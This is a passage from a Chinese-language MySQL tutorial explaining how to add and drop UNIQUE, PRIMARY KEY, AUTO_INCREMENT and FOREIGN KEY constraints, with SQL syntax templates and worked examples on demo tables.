<h2 id="3-删除非空约束"><a href="#3-删除非空约束" class="headerlink" title="3. 删除非空约束"></a>3. 删除非空约束</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 表名称 MODIFY 字段名 数据类型 <span class="keyword">NULL</span>;#去掉<span class="keyword">not</span> <span class="keyword">null</span>，相当于修改某个非注解字段，该字段允许为空</span><br><span class="line">或</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 表名称 MODIFY 字段名 数据类型;#去掉<span class="keyword">not</span> <span class="keyword">null</span>，相当于修改某个非注解字段，该字段允许为空</span><br></pre></td></tr></table></figure>
<p><strong>举例</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> test1</span><br><span class="line">MODIFY email <span class="type">VARCHAR</span>(<span class="number">25</span>) <span class="keyword">NULL</span>;</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="三、唯一性约束"><a href="#三、唯一性约束" class="headerlink" title="三、唯一性约束"></a>三、唯一性约束</h1><p><strong>作用</strong>：用来限制某个字段&#x2F;某列的值不能重复。</p>
<p><strong>关键字</strong>：<code>UNIQUE</code></p>
<h2 id="1-特点-1"><a href="#1-特点-1" class="headerlink" title="1.  特点"></a>1.  特点</h2><ul>
<li>同一个表可以有多个唯一约束。</li>
<li>唯一约束可以是某一个列的值唯一，也可以多个列组合的值唯一。</li>
<li>唯一性约束允许列值为空。</li>
<li>在创建唯一约束的时候，如果不给唯一约束命名，就默认和列名相同。</li>
<li>MySQL会给唯一约束的列上默认创建一个唯一索引。</li>
</ul>
<h2 id="2-添加唯一约束"><a href="#2-添加唯一约束" class="headerlink" title="2. 添加唯一约束"></a>2. 添加唯一约束</h2><p><strong>（1）建表时</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> 表名称(</span><br><span class="line">	字段名 数据类型,</span><br><span class="line">	字段名 数据类型 <span class="keyword">UNIQUE</span>,</span><br><span class="line">	字段名 数据类型 <span class="keyword">UNIQUE</span> KEY,</span><br><span class="line">	字段名 数据类型</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> 表名称(</span><br><span class="line">	字段名 数据类型,</span><br><span class="line">	字段名 数据类型,</span><br><span class="line">	字段名 数据类型,</span><br><span class="line">	[<span class="keyword">CONSTRAINT</span> 约束名] <span class="keyword">UNIQUE</span> KEY(字段名)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p><strong>举例</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> test2(</span><br><span class="line">	id <span class="type">INT</span> <span class="keyword">UNIQUE</span>, # 列级约束</span><br><span class="line">	last_name <span class="type">VARCHAR</span>(<span class="number">15</span>) ,</span><br><span class="line">	email <span class="type">VARCHAR</span>(<span class="number">25</span>),</span><br><span class="line">	salary <span class="type">DECIMAL</span>(<span class="number">10</span>,<span class="number">2</span>),</span><br><span class="line">	# 表级约束</span><br><span class="line">	<span class="keyword">CONSTRAINT</span> uk_test2_email <span class="keyword">UNIQUE</span>(email)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"># 在创建唯一约束的时候，如果不给唯一约束命名，就默认和列名相同。</span><br><span class="line"># 正确插入</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> test2(id,last_name,email,salary)</span><br><span class="line"><span class="keyword">VALUES</span>(<span class="number">1</span>,<span class="string">&#x27;Tom&#x27;</span>,<span class="string">&#x27;tom@126.com&#x27;</span>,<span class="number">4500</span>);</span><br><span class="line"></span><br><span class="line"># 错误：Duplicate entry <span class="string">&#x27;1&#x27;</span> <span class="keyword">for</span> key <span class="string">&#x27;test2.id&#x27;</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> test2(id,last_name,email,salary)</span><br><span class="line"><span class="keyword">VALUES</span>(<span class="number">1</span>,<span class="string">&#x27;Tom1&#x27;</span>,<span class="string">&#x27;tom1@126.com&#x27;</span>,<span class="number">4600</span>);</span><br><span class="line"></span><br><span class="line"># 可以向声明为<span class="keyword">unique</span>的字段上添加<span class="keyword">null</span>值。而且可以多次添加<span class="keyword">null</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> test2(id,last_name,email,salary)</span><br><span class="line"><span class="keyword">VALUES</span>(<span class="number">2</span>,<span class="string">&#x27;Tom1&#x27;</span>,<span class="keyword">NULL</span>,<span class="number">4600</span>);</span><br><span class="line"># 正确插入</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> test2(id,last_name,email,salary)</span><br><span class="line"><span class="keyword">VALUES</span>(<span class="number">3</span>,<span class="string">&#x27;Tom2&#x27;</span>,<span class="keyword">NULL</span>,<span class="number">4600</span>);</span><br></pre></td></tr></table></figure>

<p><strong>（2）建表后指定唯一键约束</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#字段列表中如果是一个字段，表示该列的值唯一。如果是两个或更多个字段，那么复合唯一，即多个字段的组合是唯一的</span><br><span class="line"># 方式<span class="number">1</span>：</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 表名称 <span class="keyword">ADD</span> <span class="keyword">UNIQUE</span> KEY(字段列表);</span><br><span class="line"># 方式<span class="number">2</span>：</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 表名称 MODIFY 字段名 字段类型 <span class="keyword">UNIQUE</span>;</span><br></pre></td></tr></table></figure>

<p><strong>举例</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 方式<span class="number">1</span>：</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> test2</span><br><span class="line"><span class="keyword">ADD</span> <span class="keyword">CONSTRAINT</span> uk_test2_sal <span class="keyword">UNIQUE</span>(salary);</span><br><span class="line"></span><br><span class="line"># 方式<span class="number">2</span>：</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> test2</span><br><span class="line">MODIFY last_name <span class="type">VARCHAR</span>(<span class="number">15</span>) <span class="keyword">UNIQUE</span>;</span><br></pre></td></tr></table></figure>

<h2 id="3-复合唯一约束"><a href="#3-复合唯一约束" class="headerlink" title="3. 复合唯一约束"></a>3. 复合唯一约束</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> 表名称(</span><br><span class="line">	字段名 数据类型,</span><br><span class="line">	字段名 数据类型,</span><br><span class="line">	字段名 数据类型,</span><br><span class="line">	<span class="keyword">unique</span> key(字段列表) #字段列表中写的是多个字段名，多个字段名用逗号分隔，表示那么是复合唯一，即多个字段的组合是唯一的</span><br><span class="line">);</span><br></pre></td></tr></table></figure>


<p><strong>举例</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="keyword">USER</span>(</span><br><span class="line">	id <span class="type">INT</span>,</span><br><span class="line">	`name` <span class="type">VARCHAR</span>(<span class="number">15</span>),</span><br><span class="line">	`password` <span class="type">VARCHAR</span>(<span class="number">25</span>),</span><br><span class="line">	# 表级约束</span><br><span class="line">	<span class="keyword">CONSTRAINT</span> uk_user_name_pwd <span class="keyword">UNIQUE</span>(`name`,`password`)</span><br><span class="line">);</span><br><span class="line"># 成功插入</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="keyword">USER</span></span><br><span class="line"><span class="keyword">VALUES</span>(<span class="number">1</span>,<span class="string">&#x27;Tom&#x27;</span>,<span class="string">&#x27;abc&#x27;</span>);</span><br><span class="line"># 成功插入</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="keyword">USER</span></span><br><span class="line"><span class="keyword">VALUES</span>(<span class="number">1</span>,<span class="string">&#x27;Tom1&#x27;</span>,<span class="string">&#x27;abc&#x27;</span>);</span><br></pre></td></tr></table></figure>

<h2 id="4-删除唯一约束"><a href="#4-删除唯一约束" class="headerlink" title="4. 删除唯一约束"></a>4. 删除唯一约束</h2><ul>
<li>添加唯一性约束的列上也会自动创建唯一索引。</li>
<li>删除唯一约束只能通过删除唯一索引的方式删除。</li>
<li>删除时需要指定唯一索引名，唯一索引名就和唯一约束名一样。</li>
<li>如果创建唯一约束时未指定名称，如果是单列，就默认和列名相同；如果是组合列，那么默认和()中排在第一个的列名相同。也可以自定义唯一性约束名。</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 查看都有哪些约束</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> information_schema.table_constraints </span><br><span class="line"><span class="keyword">WHERE</span> table_name <span class="operator">=</span> <span class="string">&#x27;表名&#x27;</span>; </span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> <span class="keyword">USER</span></span><br><span class="line"><span class="keyword">DROP</span> INDEX uk_name_pwd;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>可以通过 <code>show index from</code> 表名称; 查看表的索引</p>
</blockquote>
<hr>
<h1 id="四、主键约束"><a href="#四、主键约束" class="headerlink" title="四、主键约束"></a>四、主键约束</h1><p><strong>作用</strong>：用来唯一标识表中的一行记录。<br><strong>关键字</strong>：<code>PRIMARY KEY</code></p>
<h2 id="1-特点-2"><a href="#1-特点-2" class="headerlink" title="1. 特点"></a>1. 特点</h2><ul>
<li>主键约束相当于<strong>唯一约束+非空约束</strong>的组合，主键约束列不允许重复，也不允许出现空值。</li>
<li>一个表最多只能有一个主键约束，建立主键约束可以在列级别创建，也可以在表级别上创建。</li>
<li>主键约束对应着表中的一列或者多列（复合主键）</li>
<li>如果是多列组合的复合主键约束，那么这些列都不允许为空值，并且组合的值不允许重复。</li>
<li>**MySQL的主键名总是<code>PRIMARY</code>**，就算自己命名了主键约束名也没用。</li>
<li>当创建主键约束时，系统默认会在所在的列或列组合上建立对应的<strong>主键索引</strong>（能够根据主键查询的，就根据主键查询，效率更高）。如果删除主键约束了，主键约束对应的索引就自动删除了。</li>
<li>需要注意的一点是，不要修改主键字段的值。因为主键是数据记录的唯一标识，如果修改了主键的值，就有可能会破坏数据的完整性。</li>
</ul>
<h2 id="2-添加主键约束"><a href="#2-添加主键约束" class="headerlink" title="2. 添加主键约束"></a>2. 添加主键约束</h2><p><strong>（1）建表时指定主键约束</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> 表名称(</span><br><span class="line">	字段名 数据类型 <span class="keyword">PRIMARY</span> KEY, # 列级模式</span><br><span class="line">	字段名 数据类型,</span><br><span class="line">	字段名 数据类型</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> 表名称(</span><br><span class="line">	字段名 数据类型,</span><br><span class="line">	字段名 数据类型,</span><br><span class="line">	字段名 数据类型,</span><br><span class="line">	# MySQL的主键名总是<span class="keyword">PRIMARY</span>，就算自己命名了主键约束名也没用。</span><br><span class="line">	# 没有必要起名字。</span><br><span class="line">	[<span class="keyword">CONSTRAINT</span> 约束名] <span class="keyword">PRIMARY</span> KEY(字段名) # 表级模式</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p><strong>举例</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 主键约束特征：非空且唯一，用于唯一的标识表中的一条记录。</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> test4(</span><br><span class="line">	id <span class="type">INT</span> <span class="keyword">PRIMARY</span> KEY, #列级约束</span><br><span class="line">	last_name <span class="type">VARCHAR</span>(<span class="number">15</span>),</span><br><span class="line">	salary <span class="type">DECIMAL</span>(<span class="number">10</span>,<span class="number">2</span>),</span><br><span class="line">	email <span class="type">VARCHAR</span>(<span class="number">25</span>)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"># MySQL的主键名总是<span class="keyword">PRIMARY</span>，就算自己命名了主键约束名也没用。</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> test5(</span><br><span class="line">	id <span class="type">INT</span> , </span><br><span class="line">	last_name <span class="type">VARCHAR</span>(<span class="number">15</span>),</span><br><span class="line">	salary <span class="type">DECIMAL</span>(<span class="number">10</span>,<span class="number">2</span>),</span><br><span class="line">	email <span class="type">VARCHAR</span>(<span class="number">25</span>),</span><br><span class="line">	# 表级约束</span><br><span class="line">	<span class="keyword">CONSTRAINT</span> pk_test5_id <span class="keyword">PRIMARY</span> KEY(id)  # 没有必要起名字。</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p><strong>（2）建表后增加主键约束</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 表名称 <span class="keyword">ADD</span> <span class="keyword">PRIMARY</span> KEY(字段列表); #字段列表可以是一个字段，也可以是多个字段，如果是多个字段的话，是复合主键</span><br></pre></td></tr></table></figure>

<p><strong>举例</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> student <span class="keyword">ADD</span> <span class="keyword">PRIMARY</span> KEY (sid);</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> emp5 <span class="keyword">ADD</span> <span class="keyword">PRIMARY</span> KEY(NAME, pwd);</span><br></pre></td></tr></table></figure>


<h2 id="3-复合主键约束"><a href="#3-复合主键约束" class="headerlink" title="3. 复合主键约束"></a>3. 复合主键约束</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> 表名称(</span><br><span class="line">	字段名 数据类型,</span><br><span class="line">	字段名 数据类型,</span><br><span class="line">	字段名 数据类型,</span><br><span class="line">	<span class="keyword">PRIMARY</span> KEY(字段名<span class="number">1</span>,字段名<span class="number">2</span>) #表示字段<span class="number">1</span>和字段<span class="number">2</span>的组合是唯一的，也可以有更多个字段</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<h2 id="4-删除主键约束"><a href="#4-删除主键约束" class="headerlink" title="4. 删除主键约束"></a>4. 删除主键约束</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 表名称 <span class="keyword">DROP</span> <span class="keyword">PRIMARY</span> KEY;</span><br></pre></td></tr></table></figure>

<p><strong>举例</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> student <span class="keyword">DROP</span> <span class="keyword">PRIMARY</span> KEY;</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> emp5 <span class="keyword">DROP</span> <span class="keyword">PRIMARY</span> KEY;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>删除主键约束，不需要指定主键名，因为一个表只有一个主键，删除主键约束后，非空还存在。</p>
</blockquote>
<hr>
<h1 id="五、自增列：AUTO-INCREMENT"><a href="#五、自增列：AUTO-INCREMENT" class="headerlink" title="五、自增列：AUTO_INCREMENT"></a>五、自增列：AUTO_INCREMENT</h1><p><strong>作用</strong>：某个字段的值自增<br><strong>关键字</strong>：<code>AUTO_INCREMENT</code></p>
<h2 id="1-特点与要求"><a href="#1-特点与要求" class="headerlink" title="1. 特点与要求"></a>1. 特点与要求</h2><ul>
<li>一个表最多只能有一个自增长列</li>
<li>当需要产生唯一标识符或顺序值时，可设置自增长</li>
<li>自增长列约束的列<strong>必须是键列（主键列，唯一键列）</strong></li>
<li>自增约束的列的数据类型<strong>必须是整数类型</strong></li>
<li>如果自增列指定了 0 和 null，会在当前最大值的基础上自增；如果自增列手动指定了具体值，直接赋值为具体值。</li>
</ul>
<p><strong>错误演示</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> employee(</span><br><span class="line">	eid <span class="type">INT</span> AUTO_INCREMENT,</span><br><span class="line">	ename <span class="type">VARCHAR</span>(<span class="number">20</span>)</span><br><span class="line">);</span><br><span class="line"># ERROR <span class="number">1075</span> (<span class="number">42000</span>): Incorrect <span class="keyword">table</span> definition; there can be <span class="keyword">only</span> <span class="keyword">one</span> auto columnand it must be defined <span class="keyword">as</span> a key</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> employee(</span><br><span class="line">	eid <span class="type">INT</span> <span class="keyword">PRIMARY</span> KEY,</span><br><span class="line">	ename <span class="type">VARCHAR</span>(<span class="number">20</span>) <span class="keyword">UNIQUE</span> AUTO_INCREMENT</span><br><span class="line">);</span><br><span class="line"># ERROR <span class="number">1063</span> (<span class="number">42000</span>): Incorrect <span class="keyword">column</span> specifier <span class="keyword">for</span> <span class="keyword">column</span> <span class="string">&#x27;ename&#x27;</span> 因为ename不是整数类型</span><br></pre></td></tr></table></figure>

<h2 id="2-添加自增约束"><a href="#2-添加自增约束" class="headerlink" title="2. 添加自增约束"></a>2. 添加自增约束</h2><p><strong>（1）建表时</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> 表名称(</span><br><span class="line">	字段名 数据类型 <span class="keyword">PRIMARY</span> KEY AUTO_INCREMENT,</span><br><span class="line">	字段名 数据类型 </span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> 表名称(</span><br><span class="line">	字段名 数据类型,</span><br><span class="line">	字段名 数据类型 <span class="keyword">UNIQUE</span> AUTO_INCREMENT,</span><br><span class="line">	<span class="keyword">PRIMARY</span> KEY(字段名)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>


<p><strong>（2）建表后</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 表名称 MODIFY 字段名 数据类型 AUTO_INCREMENT;</span><br></pre></td></tr></table></figure>

<p><strong>举例</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> test8(</span><br><span class="line">	id <span class="type">INT</span> <span class="keyword">PRIMARY</span> KEY ,</span><br><span class="line">	last_name <span class="type">VARCHAR</span>(<span class="number">15</span>) </span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> test8</span><br><span class="line">MODIFY id <span class="type">INT</span> AUTO_INCREMENT;</span><br></pre></td></tr></table></figure>


<h2 id="3-删除自增约束"><a href="#3-删除自增约束" class="headerlink" title="3. 删除自增约束"></a>3. 删除自增约束</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 表名称 MODIFY 字段名 数据类型; #去掉auto_increment相当于删除</span><br></pre></td></tr></table></figure>

<p><strong>举例</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> employee MODIFY eid <span class="type">INT</span>;</span><br></pre></td></tr></table></figure>


<h1 id="六、外键约束"><a href="#六、外键约束" class="headerlink" title="六、外键约束"></a>六、外键约束</h1><p><strong>作用</strong>：限定某个表的某个字段的引用完整性。</p>
<p>比如：员工表的员工所在部门的选择，必须在部门表能找到对应的部分。</p>
<p><strong>关键字</strong>：<code>FOREIGN KEY</code></p>
<h2 id="1-主表和从表-父表和子表"><a href="#1-主表和从表-父表和子表" class="headerlink" title="1. 主表和从表&#x2F;父表和子表"></a>1. 主表和从表&#x2F;父表和子表</h2><ul>
<li>主表（父表）：被引用的表，被参考的表</li>
<li>从表（子表）：引用别人的表，参考别人的表<br>例如：员工表的员工所在部门这个字段的值要参考部门表：部门表是主表，员工表是从表。</li>
</ul>
<p>例如：学生表、课程表、选课表：选课表的学生和课程要分别参考学生表和课程表，学生表和课程表是主表，选课表是从表。</p>
<h2 id="2-特点"><a href="#2-特点" class="headerlink" title="2. 特点"></a>2. 特点</h2><ul>
<li>从表的外键列，必须引用&#x2F;参考主表的主键或唯一约束的列为什么？因为被依赖&#x2F;被参考的值必须是唯一的</li>
<li>在创建外键约束时，如果不给外键约束命名，<strong>默认名不是列名，而是自动产生一个外键名</strong>（例如student_ibfk_1;），也可以指定外键约束名。</li>
<li>创建(CREATE)表时就指定外键约束的话，先创建主表，再创建从表</li>
<li>删表时，先删从表（或先删除外键约束），再删除主表</li>
<li>当主表的记录被从表参照时，主表的记录将不允许删除，如果要删除数据，需要先删除从表中依赖该记录的数据，然后才可以删除主表的数据</li>
<li>在“从表”中指定外键约束，并且一个表可以建立多个外键约束</li>
<li>从表的外键列与主表被参照的列名字可以不相同，但是数据类型必须一样，逻辑意义一致。如果类型不一样，创建子表时，就会出现错误“ERROR 1005 (HY000): Can’t create table’database.tablename’(errno: 150)”。例如：都是表示部门编号，都是int类型。</li>
<li><strong>当创建外键约束时，系统默认会在所在的列上建立对应的普通索引</strong>。但是索引名是外键的约束名。（根据外键查询效率很高）</li>
<li>删除外键约束后，必须 <strong>手动</strong> 删除对应的索引</li>
</ul>
<h2 id="3-添加外键约束"><a href="#3-添加外键约束" class="headerlink" title="3. 添加外键约束"></a>3. 添加外键约束</h2><p><strong>（1）建表时</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> 主表名称(</span><br><span class="line">	字段<span class="number">1</span> 数据类型 <span class="keyword">PRIMARY</span> KEY,</span><br><span class="line">	字段<span class="number">2</span> 数据类型</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> 从表名称(</span><br><span class="line">	字段<span class="number">1</span> 数据类型 <span class="keyword">PRIMARY</span> KEY,</span><br><span class="line">	字段<span class="number">2</span> 数据类型,</span><br><span class="line">	[<span class="keyword">CONSTRAINT</span> <span class="operator">&lt;</span>外键约束名称<span class="operator">&gt;</span>] <span class="keyword">FOREIGN</span> KEY（从表的某个字段) <span class="keyword">REFERENCES</span> 主表名(被参考字段)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p><strong>举例</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># ①先创建主表</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> dept1(</span><br><span class="line">	dept_id <span class="type">INT</span>,</span><br><span class="line">	dept_name <span class="type">VARCHAR</span>(<span class="number">15</span>)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"># ②再创建从表</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> emp1(</span><br><span class="line">	emp_id <span class="type">INT</span> <span class="keyword">PRIMARY</span> KEY AUTO_INCREMENT,</span><br><span class="line">	emp_name <span class="type">VARCHAR</span>(<span class="number">15</span>),</span><br><span class="line">	department_id <span class="type">INT</span>,</span><br><span class="line">	# 表级约束</span><br><span class="line">	<span class="keyword">CONSTRAINT</span> fk_emp1_dept_id <span class="keyword">FOREIGN</span> KEY (department_id) <span class="keyword">REFERENCES</span> dept1(dept_id)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"># 上述操作报错，因为主表中的dept_id上没有主键约束或唯一性约束。</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> dept1</span><br><span class="line"><span class="keyword">ADD</span> <span class="keyword">PRIMARY</span> KEY (dept_id);</span><br><span class="line"></span><br><span class="line"># ④ 再创建从表</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> emp1(</span><br><span class="line">	emp_id <span class="type">INT</span> <span class="keyword">PRIMARY</span> KEY AUTO_INCREMENT,</span><br><span class="line">	emp_name <span class="type">VARCHAR</span>(<span class="number">15</span>),</span><br><span class="line">	department_id <span class="type">INT</span>,</span><br><span class="line">	# 表级约束</span><br><span class="line">	<span class="keyword">CONSTRAINT</span> fk_emp1_dept_id <span class="keyword">FOREIGN</span> KEY (department_id) <span class="keyword">REFERENCES</span> dept1(dept_id)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"># 演示外键的效果</span><br><span class="line"># 添加失败</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> emp1</span><br><span class="line"><span class="keyword">VALUES</span>(<span class="number">1001</span>,<span class="string">&#x27;Tom&#x27;</span>,<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> dept1</span><br><span class="line"><span class="keyword">VALUES</span>(<span class="number">10</span>,<span class="string">&#x27;IT&#x27;</span>);</span><br><span class="line"># 在主表dept1中添加了<span class="number">10</span>号部门以后，我们就可以在从表中添加<span class="number">10</span>号部门的员工</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> emp1</span><br><span class="line"><span class="keyword">VALUES</span>(<span class="number">1001</span>,<span class="string">&#x27;Tom&#x27;</span>,<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line"># 删除失败</span><br><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> dept1</span><br><span class="line"><span class="keyword">WHERE</span> dept_id <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"># 更新失败</span><br><span class="line"><span class="keyword">UPDATE</span> dept1</span><br><span class="line"><span class="keyword">SET</span> dept_id <span class="operator">=</span> <span class="number">20</span></span><br><span class="line"><span class="keyword">WHERE</span> dept_id <span class="operator">=</span> <span class="number">10</span>;</span><br></pre></td></tr></table></figure>


<p><strong>（2）建表后</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 从表名 </span><br><span class="line"><span class="keyword">ADD</span> [<span class="keyword">CONSTRAINT</span> 约束名] </span><br><span class="line"><span class="keyword">FOREIGN</span> KEY (从表的字段) </span><br><span class="line"><span class="keyword">REFERENCES</span> 主表名(被引用字段) </span><br></pre></td></tr></table></figure>

<p><strong>举例</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> emp1</span><br><span class="line"><span class="keyword">ADD</span> <span class="keyword">CONSTRAINT</span> emp_dept_id_fk</span><br><span class="line"><span class="keyword">FOREIGN</span> KEY(dept_id) </span><br><span class="line"><span class="keyword">REFERENCES</span> dept(dept_id);</span><br></pre></td></tr></table></figure>

<p><strong>约束关系是针对双方的</strong></p>
<ul>
<li>添加了外键约束后，主表的修改和删除数据受约束</li>
<li>添加了外键约束后，从表的添加和修改数据受约束</li>
<li>在从表上建立外键，要求主表必须存在</li>
<li>删除主表时，要求从表从表先删除，或将从表中外键引用该主表的关系先删除</li>
</ul>
<h2 id="4-约束等级"><a href="#4-约束等级" class="headerlink" title="4. 约束等级"></a>4. 约束等级</h2><ul>
<li><strong>Cascade方式</strong> ：在父表上update&#x2F;delete记录时，同步update&#x2F;delete掉子表的匹配记录</li>
<li><strong>Set null方式</strong> ：在父表上update&#x2F;delete记录时，将子表上匹配记录的列设为null，但是要注意子表的外键列不能为not null</li>
<li><strong>No action方式</strong> ：如果子表中有匹配的记录，则不允许对父表对应候选键进行update&#x2F;delete操作</li>
<li><strong>Restrict方式</strong> ：同no action， 都是立即检查外键约束</li>
<li><strong>Set default方式</strong> （在可视化工具SQLyog中可能显示空白）：父表有变更时，子表将外键列设置成一个默认的值，但Innodb不能识别</li>
</ul>
<p>如果没有指定等级，就相当于<strong>Restrict</strong>方式。</p>
<p>对于外键约束，最好是采用: <strong>ON UPDATE CASCADE ON DELETE RESTRICT</strong> 的方式。</p>
<h2 id="5-删除外键约束"><a href="#5-删除外键约束" class="headerlink" title="5.  删除外键约束"></a>5.  删除外键约束</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 第一步先查看约束名和删除外键约束</span><br><span class="line"># 查看某个表的约束名</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> information_schema.table_constraints <span class="keyword">WHERE</span> table_name <span class="operator">=</span> <span class="string">&#x27;表名称&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 从表名 <span class="keyword">DROP</span> <span class="keyword">FOREIGN</span> KEY 外键约束名;</span><br><span class="line"></span><br><span class="line"># 第二步查看索引名和删除索引。（注意，只能手动删除）</span><br><span class="line"># 查看某个表的索引名</span><br><span class="line"><span class="keyword">SHOW</span> INDEX <span class="keyword">FROM</span> 表名称; </span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 从表名 <span class="keyword">DROP</span> INDEX 索引名;</span><br></pre></td></tr></table></figure>

<p><strong>举例</strong></p>
